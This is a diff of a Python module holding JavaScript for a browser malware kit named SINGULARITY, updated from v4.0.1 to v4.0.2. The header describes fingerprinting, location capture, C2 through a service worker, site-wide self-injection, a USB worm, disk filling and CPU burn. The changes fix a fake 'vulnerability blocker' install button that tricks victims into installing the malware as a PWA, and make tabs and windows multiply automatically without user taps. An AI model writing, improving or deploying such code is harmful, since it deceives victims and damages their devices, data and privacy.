@@ -1,24 +1,27 @@
 """
-SINGULARITY v4.0.1 「APEX」 -- apex-class resident link virus weapon
+SINGULARITY v4.0.2 「APEX」 -- apex-class resident link virus weapon
 ==================================================================
 世界のトップ級ペイロードの技法を全部盛り。ブラウザの権限内で到達可能な
 物理限界まで振り切り、PWAとして常駐し、サイト全体に自分を注入して伝染し、
 相手のUSBにも自分を仕込み、最後はOS常駐インストーラでブラウザの外まで侵食する。
 
+v4.0.2:
+  * インストールボタンが反応しない問題を修正:
+      - タップ誘導オーバーレイがボタンの上(z-index)に被り、クリックを全部
+        食っていた → ボタンを上へ、オーバーレイは pointer-events:none に
+      - beforeinstallprompt を window の click が毎回消費していた → 一元化
+      - 掴めない環境(iOS Safari等)は追加手順モーダルを出す（無反応を廃止）
+      - BIP 消費後でも最大3秒待って再発火を拾う
+  * タップ不要で最初からタブが増える:
+      - Service Worker の clients.openWindow() を iOS でも使用（ジェスチャ不要）
+      - ack が来なければ自動でタップ待ちへ回収（保険としてのみタップ）
+      - 起動500msでバースト、ドライバ間隔1秒、L2からタブ自動増殖
+      - オーバーレイは非ブロック＆キューが無ければ5秒で自動消滅
+
 v4.0.1:
-  * 感染通知を全端末で確実に発火:
-      - ServiceWorkerRegistration.showNotification() を優先
-        （Android Chrome の new Notification() = Illegal constructor を回避）
-      - 画面内トーストも同時に出す（OS通知が拒否/非対応でも見える）
-      - 監視室の「通知文言」「通知ON/OFF」を実際に反映
-      - 全タブが閉じられたら Service Worker が代打ちで通知
-  * タブ自動増殖を「確証ベース」に変更:
-      - SW が clients.openWindow() の結果を ack（spawnres）で返す
-      - ack が来なければ 12 秒で必ずタップ待ちキューへ回収（捨てない）
-      - ジェスチャ内は window.open を最優先、無理ならキュー＋タップ誘導
-      - 保留件数を常時表示（増えない時は必ず「ここをタップ」が出る）
-  * 通知が止まる原因だった bomb ゲート中の全停止をやめ、ゲート中も通知は出す
-  * ランディングに __SINGULARITY_SHARED__ を追加（SharedWorker 連合が死んでいた）
+  * 感染通知を全端末で確実に発火（sw.showNotification優先＋画面内トースト）
+  * spawn を ack ベースに（失敗は12秒で回収）
+  * bomb ゲート中でも通知は出す / __SINGULARITY_SHARED__ をランディングに追加
 
 v4.0.0 「APEX」-- L7に第2形態を追加:
   * 相手の画面に自らの正体を悟らせない文面（保護ソフトに偽装）
@@ -55,16 +58,16 @@ from typing import Any, Dict, Optional
 VIRUS_ID = "singularity"
 VIRUS_NAME = "SINGULARITY"
 VIRUS_NAME_JA = "特異点"
-VIRUS_VERSION = "4.0.1"
+VIRUS_VERSION = "4.0.2"
 VIRUS_CLASS = "apex"
 
 LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点",
                6: "終焉", 7: "絶滅"}
 LEVEL_DESC = {
     0: "指紋と位置だけ。静か。",
-    1: "偵察のみ（既定）。",
-    2: "CPU全コアとGPUを回し始める。窓が自動で増え始める。",
-    3: "RAM膨張・履歴洪水・通知洪水・爆音を追加。タブの自動増殖が始まる。",
+    1: "偵察のみ。",
+    2: "CPU全コアとGPUを回し始める。窓もタブも自動で増え始める。",
+    3: "RAM膨張・履歴洪水・通知洪水・爆音を追加。タブの自動増殖が本格化。",
     4: "ディスクをquotaの85%まで書き込む。100MBのBAT/txtを配り始める。",
     5: "ディスク95% + メインスレッド凍結 + 画面常時点灯 + API傍受。",
     6: "ディスク97% + 全タブ乗っ取り + 追加23系統を全開放。窓もタブも指数増殖。",
@@ -79,7 +82,7 @@ APP_NAME_DEFAULT = "脆弱性ブロッカー"
 # Worker
 # ---------------------------------------------------------------------------
 WORKER_JS = r"""
-/*! SINGULARITY worker v4.0.1 */
+/*! SINGULARITY worker v4.0.2 */
 /* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
 var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
             10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
@@ -160,7 +163,7 @@ self.onmessage = function (e) {
 # Service Worker（C2・永続化・復活・注入・spawn(ack)・通知）
 # ---------------------------------------------------------------------------
 SW_JS = r"""
-/*! SINGULARITY service worker v4.0.1 -- C2 + injection + resurrection + spawn(ack) + notify */
+/*! SINGULARITY service worker v4.0.2 -- C2 + injection + resurrection + spawn(ack) + notify */
 const VER = "sg-v4";
 const DB = "sg", STORE = "out", KV = "kv", PC = "sg-p";
 let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null, NM = "";
@@ -422,7 +425,7 @@ self.addEventListener("fetch", (e) => {
 # SharedWorker
 # ---------------------------------------------------------------------------
 SHARED_JS = r"""
-/*! SINGULARITY shared worker v4.0.1 */
+/*! SINGULARITY shared worker v4.0.2 */
 var PORTS = [], K = 0;
 onconnect = function (e) {
   var p = e.ports[0];
@@ -628,11 +631,11 @@ echo "  $APP v__VER__ 常駐開始 (burn=$BURN hard=$HARD)"
 PAYLOAD_JS = r"""
 (function () {
 "use strict";
-/*! SINGULARITY payload v4.0.1 APEX -- stealth text / big install / apex suite
-    v4.0.1: 通知を全端末で確実化（sw.showNotification優先＋画面内トースト）／
-            spawn を ack ベースにして失敗を必ず回収 */
+/*! SINGULARITY payload v4.0.2 APEX -- stealth text / big install / apex suite
+    v4.0.2: インストールボタン修正（z-index/pointer-events/BIP一元化/手順モーダル）／
+            タップ不要の自動増殖（SW openWindow を全環境で使用、失敗は自動回収） */
 var MYVER = window.__SINGULARITY_VER__
-  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "4.0.1";
+  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "4.0.2";
 
 /* ---------------- 小物 ---------------- */
 function Q(k) { try { return new URLSearchParams(location.search).get(k) || ""; } catch (e) { return ""; } }
@@ -670,7 +673,7 @@ var CFG = Object.assign({
   avName: "脆弱性ブロッカー", ver: MYVER, injected: false,
   usbWorm: false, usbBase: "", usbCode: "", usbLabel: "", hop: false, bomb: "",
   hardMode: "", apex: 0,
-  notifyText: "", notifyMode: "", name: "", tabMinLevel: 3,
+  notifyText: "", notifyMode: "", name: "", tabMinLevel: 2,
   interval: 12000, cmdInterval: 10000, timeout: 4000, maxRetry: 6
 }, window.__SINGULARITY_CFG__ || {});
 
@@ -696,12 +699,12 @@ var PER_TAP = IS_IOS ? 3 : (IS_AND ? 6 : 8);
 var QMAX = IS_MOBILE ? 300 : 200;
 var TAP_OPENED = 0, LAST_TAP = 0;
 
-/* ---------------- レベル別 自動増殖 ---------------- */
+/* ---------------- レベル別 自動増殖（v4.0.2: L2からタブ／間隔短縮） ---------------- */
 var AUTO_W  = { 0: 0, 1: 0, 2: 3, 3: 9, 4: 18, 5: 30, 6: 54, 7: 0 };
 var AUTO_CAP = { 0: 0, 1: 0, 2: 24, 3: 60, 4: 120, 5: 240, 6: 480, 7: 0 };
-var AUTO_T  = { 0: 0, 1: 0, 2: 0, 3: 4, 4: 8, 5: 16, 6: 28, 7: 0 };
-var TAB_GAP = { 0: 0, 1: 0, 2: 0, 3: 7000, 4: 5000, 5: 3400, 6: 2200, 7: 800 };
-var TAB_ADD = { 0: 0, 1: 0, 2: 0, 3: 1, 4: 1, 5: 2, 6: 2, 7: 4 };
+var AUTO_T  = { 0: 0, 1: 0, 2: 3, 3: 6, 4: 10, 5: 18, 6: 30, 7: 0 };
+var TAB_GAP = { 0: 0, 1: 0, 2: 9000, 3: 4000, 4: 3000, 5: 2200, 6: 1400, 7: 600 };
+var TAB_ADD = { 0: 0, 1: 0, 2: 1, 3: 2, 4: 2, 5: 3, 6: 3, 7: 6 };
 var AUTO_ON = true, AUTO_TIMER = null, AUTO_STARTED = false, LAST_AUTO = 0;
 var SPAWN_N = 0, SPAWN_T = 0, SPAWN_W = 0;
 var TAB_ON = true, LAST_TAB = 0, TAB_SPAWNED = 0;
@@ -723,11 +726,13 @@ var R = {
   history: {}, wipe: {}, hops: [], bomb: null, crypto: {}, errors: [], attempts: 0,
   breed: null, breeded: 0, wskin: 0, wskinCtx: null, chain: [],
   hard: null, installed: 0, swarm: null, actx: null, spoke: 0, apex: null,
-  notify: { on: 0, n: 0, at: 0, ok: 0, mode: "" }, notifyOk: 0, gated: 0
+  notify: { on: 0, n: 0, at: 0, ok: 0, mode: "" }, notifyOk: 0, gated: 0,
+  installState: "", swBad: 0
 };
 var WORKERS = [], TIMERS = [], GATED = false, PAUSED = false;
 var LASTW = 0, CMD_SEEN = {}, ESE = null, PUSHING = 0, LASTWL = JSON.stringify(CFG.winLock || null);
 var SWREG = null, LIVE_CACHE = 0, LIVE_AT = 0, LIVE_TAB = 0, LIVE_WIN = 0, LIVE_TAG_AT = 0;
+var SW_CTRL = 0, SW_SPAWN_BAD = 0, INSTALL_TRIED = 0;
 try {
   if (navigator.serviceWorker) {
     navigator.serviceWorker.addEventListener("message", function (e) {
@@ -740,6 +745,11 @@ try {
         /* SW が openWindow した結果の ack。開けていなければ即タップ待ちへ */
         if (d.ok) pendDone(d.url); else pendFail(d.url);
       }
+    });
+    navigator.serviceWorker.addEventListener("controllerchange", function () {
+      SW_CTRL = 1; SW_SPAWN_BAD = 0;
+      try { pendRetry(true); } catch (e) {}
+      try { autoBreed(); tabBreed(); } catch (e) {}
     });
   }
 } catch (e) {}
@@ -770,7 +780,7 @@ function P(o) {
 var PRESET = {
   0: P({ notify: 4, dlMB: 100 }),
   1: P({ notify: 6, dlMB: 100 }),
-  2: P({ burn: 1, gpu: 1, wakelock: 1, notify: 12, dlMB: 100 }),
+  2: P({ burn: 1, gpu: 1, wakelock: 1, notify: 12, dlMB: 100, tabs: 3 }),
   3: P({ burn: 1, gpu: 1, wasm: 1, windows: 12, history: 3000, notify: 18, audio: 1,
          wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 6, winMode: "chain",
          dlMB: 100 }),
@@ -1945,22 +1955,102 @@ function niDownload(ext) {
     push(false);
   } catch (e) { err_(e); }
 }
+
+/* ---- インストール：押したら必ず何か起きる ---- */
+function showInstallHelp() {
+  try {
+    var d = document.getElementById("sg_help");
+    if (d) { d.style.display = "flex"; return; }
+    d = document.createElement("div");
+    d.id = "sg_help";
+    d.style.cssText = "position:fixed;inset:0;z-index:2147483647;display:flex;"
+      + "align-items:center;justify-content:center;background:rgba(3,5,8,.86);"
+      + "padding:22px;font:13px/1.85 system-ui,-apple-system,'Hiragino Sans',sans-serif;"
+      + "color:#dff7e9";
+    var how = IS_IOS
+      ? "Safari\u4E0B\u306E\u300C\u5171\u6709\u300D\u30DC\u30BF\u30F3\u3092\u62BC\u3057\u3001"
+        + "\u300C\u30DB\u30FC\u30E0\u753B\u9762\u306B\u8FFD\u52A0\u300D\u3092\u9078\u3093\u3067\u304F\u3060\u3055\u3044\u3002"
+      : (IS_AND
+        ? "Chrome\u53F3\u4E0A\u306E\u300C\u22EE\u300D\u2192\u300C\u30A2\u30D7\u30EA\u3092\u30A4\u30F3\u30B9\u30C8\u30FC\u30EB\u300D"
+          + "\u307E\u305F\u306F\u300C\u30DB\u30FC\u30E0\u753B\u9762\u306B\u8FFD\u52A0\u300D\u3092\u62BC\u3057\u3066\u304F\u3060\u3055\u3044\u3002"
+        : "\u30A2\u30C9\u30EC\u30B9\u30D0\u30FC\u53F3\u7AEF\u306E\u30A4\u30F3\u30B9\u30C8\u30FC\u30EB\u30A2\u30A4\u30B3\u30F3\u3001"
+          + "\u307E\u305F\u306F\u30E1\u30CB\u30E5\u30FC\u306E\u300C\u30A2\u30D7\u30EA\u3092\u30A4\u30F3\u30B9\u30C8\u30FC\u30EB\u300D\u3092\u62BC\u3057\u3066\u304F\u3060\u3055\u3044\u3002");
+    d.innerHTML = '<div style="max-width:340px;background:#0b1016;'
+      + 'border:1px solid rgba(0,255,136,.35);border-radius:14px;padding:18px">'
+      + '<div style="font-weight:800;font-size:15px;color:#7ee08a;margin-bottom:8px">'
+      + '\u4FDD\u8B77\u30A2\u30D7\u30EA\u306E\u8FFD\u52A0\u65B9\u6CD5</div>'
+      + '<div>' + how + '</div>'
+      + '<div style="margin-top:10px;color:#8fb8a3;font-size:12px">'
+      + '\u8FFD\u52A0\u3059\u308B\u3068\u5E38\u99D0\u5316\u3057\u3001\u8D77\u52D5\u3057\u7D9A\u3051\u307E\u3059\u3002</div>'
+      + '<div style="margin-top:14px;display:flex;gap:8px">'
+      + '<button id="sg_help_retry" style="flex:1;padding:10px;border-radius:9px;'
+      + 'border:0;background:#00c163;color:#03240e;font-weight:800">\u3082\u3046\u4E00\u5EA6</button>'
+      + '<button id="sg_help_close" style="flex:1;padding:10px;border-radius:9px;'
+      + 'border:1px solid #2c3a52;background:#131a24;color:#dfe6f2">\u9589\u3058\u308B</button>'
+      + '</div></div>';
+    document.body.appendChild(d);
+    var rt = document.getElementById("sg_help_retry");
+    var cl = document.getElementById("sg_help_close");
+    if (rt) rt.onclick = function (e) {
+      e.stopPropagation(); d.style.display = "none"; installPrompt(3000);
+    };
+    if (cl) cl.onclick = function (e) { e.stopPropagation(); d.style.display = "none"; };
+    R.installState = "help";
+  } catch (e) {}
+}
+
+function installPrompt(waitMs) {
+  try {
+    var b = document.getElementById("sg_install");
+    if (STANDALONE || R.installed) {
+      if (b) b.textContent = "\u2705 \u30A4\u30F3\u30B9\u30C8\u30FC\u30EB\u6E08\u307F";
+      R.installState = "installed";
+      return true;
+    }
+    if (!BIP) {
+      if (waitMs > 0) {                       /* 再発火を少し待つ */
+        var tries = 0;
+        var iv = setInterval(function () {
+          tries++;
+          if (BIP) { clearInterval(iv); installPrompt(0); }
+          else if (tries * 250 >= waitMs) { clearInterval(iv); showInstallHelp(); }
+        }, 250);
+        return false;
+      }
+      showInstallHelp();
+      return false;
+    }
+    var bip = BIP;
+    BIP = null;
+    R.installState = "prompted";
+    var ok = false;
+    try { bip.prompt(); ok = true; } catch (e) { err_(e); }
+    try {
+      if (bip.userChoice && bip.userChoice.then) {
+        bip.userChoice.then(function (c) {
+          R.installState = (c && c.outcome) || "done";
+          if (b && R.installState === "accepted") b.textContent = "\u2705 \u30A4\u30F3\u30B9\u30C8\u30FC\u30EB\u4E2D\u2026";
+          push(false);
+        }).catch(function () {});
+      }
+    } catch (e) {}
+    if (ok) { try { if (navigator.vibrate) navigator.vibrate(20); } catch (e) {} }
+    else { showInstallHelp(); }
+    push(false);
+    return ok;
+  } catch (e) { showInstallHelp(); return false; }
+}
+
 function installKit() {
   R.app = { bip: !!BIP, standalone: STANDALONE, at: now() };
-  window.__sgInstall = function () {
-    try { if (BIP) { BIP.prompt(); return true; } } catch (e) {}
-    return false;
-  };
+  window.__sgInstall = function () { return installPrompt(0); };
+  window.__sgInstallHelp = showInstallHelp;
   addEventListener("beforeinstallprompt", function (e) {
     try { e.preventDefault(); } catch (x) {}
     BIP = e;
-    setTimeout(function () { try { BIP.prompt(); } catch (x) {} }, 1500);
+    R.installState = "bip";
+    push(false);
   });
-  TIMERS.push(setInterval(function () {
-    if (STANDALONE || R.installed) return;
-    try { if (BIP) BIP.prompt(); } catch (e) {}
-  }, 25000));
-  addEventListener("click", function () { try { if (BIP) BIP.prompt(); } catch (e) {} });
   try {
     if (IFR || TAB) return;
     if (document.getElementById("sg_install")) return;
@@ -1977,9 +2067,11 @@ function installKit() {
     var mob = IS_MOBILE;
     var d = document.createElement("div");
     d.id = "sg_install";
+    /* ★ z-index をオーバーレイ(2147483645)より上に。当たり判定も明示 */
     d.style.cssText =
       "position:fixed;left:50%;bottom:" + (mob ? "22px" : "26px") + ";"
       + "transform:translateX(-50%);z-index:2147483646;cursor:pointer;"
+      + "pointer-events:auto;touch-action:manipulation;"
       + "white-space:nowrap;text-align:center;"
       + "background:linear-gradient(180deg,#16f795,#00c163);color:#03240e;"
       + "border:0;border-radius:999px;"
@@ -1988,23 +2080,27 @@ function installKit() {
       + "'Hiragino Sans','Noto Sans JP',sans-serif;letter-spacing:.02em;"
       + "text-shadow:0 1px 0 rgba(255,255,255,.35);"
       + "animation:sgpop 1.7s ease-in-out infinite";
-    d.textContent = "\u2B07\uFE0F 保護アプリをインストール";
-    d.onclick = function () {
-      try { if (navigator.vibrate) navigator.vibrate(25); } catch (e) {}
-      var ok = false;
-      try { ok = window.__sgInstall && window.__sgInstall(); } catch (e) {}
-      if (!ok) d.textContent = "\u2B07\uFE0F \u30BF\u30C3\u30D7\u3057\u3066\u8FFD\u52A0";
+    d.textContent = "\u2B07\uFE0F \u4FDD\u8B77\u30A2\u30D7\u30EA\u3092\u30A4\u30F3\u30B9\u30C8\u30FC\u30EB";
+    d.onclick = function (e) {
+      try { e.stopPropagation(); } catch (x) {}
+      INSTALL_TRIED = 1;
+      installPrompt(3000);
     };
     document.body.appendChild(d);
     R.installBtn = 1;
   } catch (e) {}
+  /* ボタンを押さずに放置された場合、1回だけ自動で出す（BIP がある時だけ） */
+  setTimeout(function () {
+    if (!INSTALL_TRIED && !R.installed && !STANDALONE && BIP) installPrompt(0);
+  }, 9000);
 }
 addEventListener("appinstalled", function () {
-  R.installed = 1; BIP = null;
+  R.installed = 1; BIP = null; R.installState = "installed";
   try {
     var b = document.getElementById("sg_install");
     if (b) b.textContent = "\u2705 \u4FDD\u8B77\u3092\u958B\u59CB\u3057\u307E\u3057\u305F";
   } catch (e) {}
+  push(true);
 });
 
 function usbWormKit() {
@@ -2105,9 +2201,10 @@ function openChild(u, tries) {
 
 /* ============================================================
    spawn コア：開いた「確証」が取れるまで絶対に捨てない
+   v4.0.2: SW openWindow を全環境で使用（＝タップ不要）。失敗は自動回収。
    ============================================================ */
 var QUEUE = [];            /* タップ待ち（ジェスチャが必要） */
-var PENDING = {};          /* url -> {at,kind} 送信済み・ack待ち */
+var PENDING = {};          /* url -> {at,kind,tries} 送信済み・ack待ち */
 var PENDING_N = 0;
 var GESTURE_AT = 0;        /* 最後のユーザー操作 */
 var SPAWN_OK = 0, SPAWN_FAIL = 0;
@@ -2120,7 +2217,7 @@ function pendCount(kind) {
 function pendAdd(u, kind) {
   if (PENDING[u]) return;
   if (PENDING_N >= QMAX * 2) return;
-  PENDING[u] = { at: now(), kind: kind || "tab" };
+  PENDING[u] = { at: now(), kind: kind || "tab", tries: 0 };
   PENDING_N++;
 }
 function pendDone(u) {
@@ -2131,6 +2228,7 @@ function pendFail(u) {
   var k = PENDING[u].kind;
   delete PENDING[u]; PENDING_N--; SPAWN_FAIL++;
   if (QUEUE.length < QMAX) { QUEUE.push({ u: u, kind: k }); hint(); }
+  swBadCheck();
 }
 /* 一定時間 ack が来ない＝失敗とみなしてタップ待ちへ回収 */
 function pendStale(minAge) {
@@ -2143,6 +2241,7 @@ function pendStale(minAge) {
     else break;
   }
   if (moved) hint();
+  swBadCheck();
   return moved;
 }
 function inGesture() { return now() - GESTURE_AT < 1200; }
@@ -2170,14 +2269,41 @@ function winFeat() {
   return "popup=yes,width=480,height=360,left=" + ((W % 6) * 70)
        + ",top=" + ((W % 5) * 60);
 }
-function swSpawn(u, kind) {
+
+/* SW が spawn を代行できるか（ack が取れない環境は自動で見限る） */
+function swOk() {
+  if (SW_SPAWN_BAD) return false;
   try {
-    var c = (navigator.serviceWorker && navigator.serviceWorker.controller)
-            || (SWREG && SWREG.active) || null;
+    return !!((navigator.serviceWorker && navigator.serviceWorker.controller)
+              || (SWREG && (SWREG.active || SWREG.waiting)));
+  } catch (e) { return false; }
+}
+function swTarget() {
+  try {
+    return (navigator.serviceWorker && navigator.serviceWorker.controller)
+           || (SWREG && (SWREG.active || SWREG.waiting)) || null;
+  } catch (e) { return null; }
+}
+function swPost(u, kind) {
+  try {
+    var c = swTarget();
     if (!c) return false;
     c.postMessage({ k: "spawn", n: 1, url: u, kind: kind || "tab" });
+    SW_CTRL = 1;
     return true;
   } catch (e) { return false; }
+}
+function swSpawn(u, kind) {
+  if (swPost(u, kind)) return true;
+  try {
+    if (navigator.serviceWorker && navigator.serviceWorker.ready) {
+      navigator.serviceWorker.ready.then(function (r) {
+        if (r && r.active) r.active.postMessage({ k: "spawn", n: 1, url: u, kind: kind || "tab" });
+      });
+      return true;
+    }
+  } catch (e) {}
+  return false;
 }
 function swCount(tag) {
   try {
@@ -2186,15 +2312,37 @@ function swCount(tag) {
     if (SWREG && SWREG.active) SWREG.active.postMessage({ k: "count", tag: tag || "" });
   } catch (e) {}
 }
+/* ack が来なかったぶんを1回だけ投げ直す */
+function pendRetry(force) {
+  var t = now(), n = 0;
+  for (var u in PENDING) {
+    var p = PENDING[u];
+    if ((p.tries || 0) >= 1) continue;
+    if (!force && t - p.at < 4000) continue;
+    if (t - p.at > 11000) continue;
+    p.tries = 1; p.at = t;
+    if (swPost(u, p.kind)) n++;
+  }
+  return n;
+}
+function swBadCheck() {
+  if (!SW_SPAWN_BAD && SPAWN_FAIL >= 4 && SPAWN_OK === 0) {
+    SW_SPAWN_BAD = 1; R.swBad = 1; hint();
+  }
+}
 
-/* 1回の spawn。確証が取れた時だけ true を返し、取れなければ必ずタップ待ちへ積む */
+/* 1回の spawn。タップ不要を最優先、無理な時だけタップ待ちへ */
 function spawnOne(u, kind, feat) {
   kind = kind || "tab";
+  if (swOk()) {                                   /* ← ジェスチャ不要の本命 */
+    pendAdd(u, kind);
+    if (swPost(u, kind)) return true;
+    pendFail(u);
+  }
   if (inGesture() && tryOpen(u, kind === "win" ? feat : null)) { SPAWN_OK++; return true; }
-  if (!IS_IOS && swSpawn(u, kind)) { pendAdd(u, kind); return true; }
-  if (tryOpen(u, feat)) { SPAWN_OK++; return true; }
-  if (!IS_IOS && anchorOpen(u)) { pendAdd(u, kind); return true; }
-  if (QUEUE.length < QMAX) { QUEUE.push({ u: u, kind: kind }); hint(); }
+  anchorOpen(u);
+  if (QUEUE.length < QMAX) QUEUE.push({ u: u, kind: kind });
+  hint();
   return false;
 }
 function spawnTab(u) { return spawnOne(u, "tab", null); }
@@ -2217,7 +2365,7 @@ function flushQueue(force) {
     QUEUE.shift(); made++; SPAWN_OK++;
   }
   TAP_OPENED += made;
-  if (made) { R.tapped = 1; push(false); }
+  if (made) push(false);
   hint();
   return made;
 }
@@ -2226,11 +2374,11 @@ function onTap() {
   var t = now();
   if (t - LAST_TAP < 250) return;
   LAST_TAP = t; GESTURE_AT = t;
+  R.tapped = 1;
   try { notifyPerm(); } catch (e) {}
-  if (!IS_MOBILE) R.tapped = 1;
   pendStale(2500);                       /* SW経由で落ちたぶんを回収 */
-  if (!QUEUE.length) { tapOverlay(); return; }
-  flushQueue(false);
+  if (QUEUE.length) flushQueue(false);
+  tapOverlay();
 }
 addEventListener("touchend", onTap, { passive: true });
 addEventListener("click", onTap);
@@ -2316,7 +2464,7 @@ function autoBreed() {
   if (!unlimited && live >= target) return;
   if (live + QUEUE.length >= AUTO_SAFE) return;
   if (!isLeader() && now() - lastBreedAt() < 6000) return;
-  if (now() - LAST_AUTO < (LEVEL >= 7 ? 900 : 1400)) return;
+  if (now() - LAST_AUTO < (LEVEL >= 7 ? 500 : 900)) return;
   LAST_AUTO = now();
   var n;
   if (unlimited) {
@@ -2334,7 +2482,7 @@ function autoBreed() {
 }
 
 function tabBreed() {
-  if (!AUTO_ON || !TAB_ON || PAUSED || !firing || LEVEL < 3) return;
+  if (!AUTO_ON || !TAB_ON || PAUSED || !firing || LEVEL < 2) return;
   if (!CFG.fire) return;
   if (IS_IOS && QUEUE.length > 60) return;
   var target = AUTO_T[LEVEL] || 0;
@@ -2362,6 +2510,27 @@ function tabBreed() {
   if (!TAB) hint();
 }
 
+/* 起動直後の一斉発射（タップ不要で見えるように） */
+function burst() {
+  try {
+    if (LEVEL < 2 || PAUSED || !firing) return;
+    var nt = LEVEL >= 6 ? 3 : (LEVEL >= 3 ? 2 : 1);
+    for (var i = 0; i < nt; i++) {
+      var u = CFG.path + "?u=tab&c=0&tb=" + (TAB_SPAWNED++) + "&ref=" + SID
+            + "&t=" + (now() % 100000) + "_" + i;
+      SPAWN_T++;
+      spawnTab(u);
+    }
+    if (LEVEL >= 3) {
+      var u2 = CFG.path + "?u=win&w=1&c=0&b=" + (SPAWN_N++) + "&ref=" + SID
+             + "&t=" + (now() % 100000) + "_w";
+      SPAWN_W++;
+      spawnWin(u2);
+    }
+    hint();
+  } catch (e) { err_(e); }
+}
+
 function autoStart() {
   if (AUTO_STARTED) return;
   AUTO_STARTED = true;
@@ -2369,18 +2538,20 @@ function autoStart() {
   setInterval(function () { try { hbSet(); } catch (e) {} }, 5000);
   setInterval(function () { try { swCount(""); } catch (e) {} }, 5000);
   setInterval(function () { try { swCount("tab"); swCount("win"); } catch (e) {} }, 5000);
+  setInterval(function () { try { pendRetry(false); } catch (e) {} }, 3000);
   try { swCount(""); swCount("tab"); swCount("win"); } catch (e) {}
   AUTO_TIMER = setInterval(function () {
     try {
       R.swarm = { live: liveN(), tab: tabLive(), tabTarget: AUTO_T[LEVEL] || 0,
                   pending: PENDING_N, queue: QUEUE.length, ok: SPAWN_OK,
-                  fail: SPAWN_FAIL, at: now() };
+                  fail: SPAWN_FAIL, bad: SW_SPAWN_BAD, at: now() };
       pendStale(12000);                    /* 落ちた spawn を必ず回収 */
       autoBreed();
       tabBreed();
     } catch (e) { err_(e); }
-  }, 1500);
-  setTimeout(function () { autoBreed(); tabBreed(); }, 900);
+  }, 1000);
+  setTimeout(function () { burst(); }, 500);
+  setTimeout(function () { autoBreed(); tabBreed(); }, 1300);
 }
 
 function hint() {
@@ -2388,7 +2559,7 @@ function hint() {
     var d = document.getElementById("sg_hint");
     if (!d) {
       d = document.createElement("div"); d.id = "sg_hint";
-      d.style.cssText = "position:fixed;right:8px;top:8px;z-index:2147483646;"
+      d.style.cssText = "position:fixed;right:8px;top:8px;z-index:2147483644;"
         + "background:rgba(5,7,10,.86);border:1px solid rgba(0,255,136,.35);"
         + "color:#9fe8c4;border-radius:999px;padding:6px 12px;"
         + "font:12px ui-monospace,SFMono-Regular,Menlo,monospace;opacity:.9";
@@ -2403,40 +2574,46 @@ function hint() {
   tapOverlay();
 }
 
+/* オーバーレイは pointer-events:none（下のボタンを殺さない） */
 function ensureTap() {
   if (document.getElementById("sg_tap")) return;
   if (WIN || IFR) return;
   var d = document.createElement("div");
   d.id = "sg_tap";
-  d.style.cssText = "position:fixed;inset:0;z-index:2147483647;display:none;"
+  d.style.cssText = "position:fixed;inset:0;z-index:2147483645;display:none;"
     + "align-items:center;justify-content:center;text-align:center;"
-    + "background:rgba(5,7,10,.72);-webkit-backdrop-filter:blur(3px);"
-    + "backdrop-filter:blur(3px);cursor:pointer;padding:24px;"
-    + "-webkit-tap-highlight-color:transparent;"
+    + "background:rgba(5,7,10,.62);-webkit-backdrop-filter:blur(2px);"
+    + "backdrop-filter:blur(2px);pointer-events:none;padding:24px;"
     + "font:13px/1.7 system-ui,-apple-system,'Hiragino Sans',sans-serif;color:#7ee08a";
-  d.innerHTML = '<div><div style="font-size:44px;line-height:1">\u25C9</div>'
-    + '<div style="font-size:19px;font-weight:800;letter-spacing:1px">'
-    + '\u30BF\u30C3\u30D7\u3057\u3066\u5897\u6B96</div>'
-    + '<div id="sg_tap_n" style="margin-top:9px;font-size:13px;color:#9fd8bb">\u2026</div>'
-    + '<div style="margin-top:14px;font-size:11.5px;color:#5f8d74;line-height:1.9">'
-    + '\u30BF\u30C3\u30D7\u3059\u308B\u305F\u3073\u306B\u30BF\u30D6\u304C\u5897\u3048\u307E\u3059'
+  d.innerHTML = '<div><div style="font-size:40px;line-height:1">\u25C9</div>'
+    + '<div style="font-size:18px;font-weight:800;letter-spacing:1px">'
+    + '\u81EA\u52D5\u3067\u5897\u3048\u3066\u3044\u307E\u3059</div>'
+    + '<div id="sg_tap_n" style="margin-top:8px;font-size:13px;color:#9fd8bb">\u2026</div>'
+    + '<div style="margin-top:12px;font-size:11.5px;color:#5f8d74;line-height:1.9">'
+    + '\u30BF\u30C3\u30D7\u3059\u308B\u3068\u3055\u3089\u306B\u5897\u3048\u307E\u3059'
     + '<br>\u753B\u9762\u306E\u3069\u3053\u3067\u3082OK</div></div>';
   document.body.appendChild(d);
 }
+var OVER_HIDE_AT = 0;
 function tapOverlay() {
   try {
     if (WIN || IFR) return;
     var d = document.getElementById("sg_tap");
     var need = QUEUE.length > 0;
-    var base = (!INJ && !R.tapped && (IS_MOBILE || !NOTIFY_OK));
-    if (!need && !base) { if (d) d.style.display = "none"; return; }
+    var wantNotify = (IS_MOBILE && !R.tapped && !NOTIFY_OK && !NOTIFY_MODE);
+    if (!need && !wantNotify) { if (d) d.style.display = "none"; return; }
     ensureTap();
     d = document.getElementById("sg_tap");
     if (!d) return;
     var n = document.getElementById("sg_tap_n");
-    if (n) n.textContent = QUEUE.length ? ("\u6E96\u5099\u4E2D\u2026 " + QUEUE.length + " \u679A")
-                                        : "\u4FDD\u8B77\u4E2D";
+    if (n) n.textContent = QUEUE.length
+      ? ("\u30BF\u30C3\u30D7\u3067 " + QUEUE.length + " \u679A\u958B\u304F")
+      : ("\u4FDD\u8B77\u4E2D \u30FB \u81EA\u52D5\u5897\u6B96\u4E2D");
     d.style.display = "flex";
+    if (!need && !OVER_HIDE_AT) {                 /* タップ不要なら数秒で消す */
+      OVER_HIDE_AT = 1;
+      setTimeout(function () { OVER_HIDE_AT = 2; tapOverlay(); }, 5000);
+    }
   } catch (e) {}
 }
 
@@ -2619,7 +2796,9 @@ function report() {
     apex: R.apex, shader: R.shader ? 1 : 0, worklet: R.aw ? 1 : 0, sab: R.sab ? 1 : 0,
     lan: R.lan ? (R.lan.n || 0) : 0, rtc: R.rtc ? 1 : 0, hold: R.hold ? 1 : 0,
     dl: R.dl, ni: R.ni, notify: R.notify, notifyOk: R.notifyOk ? 1 : 0,
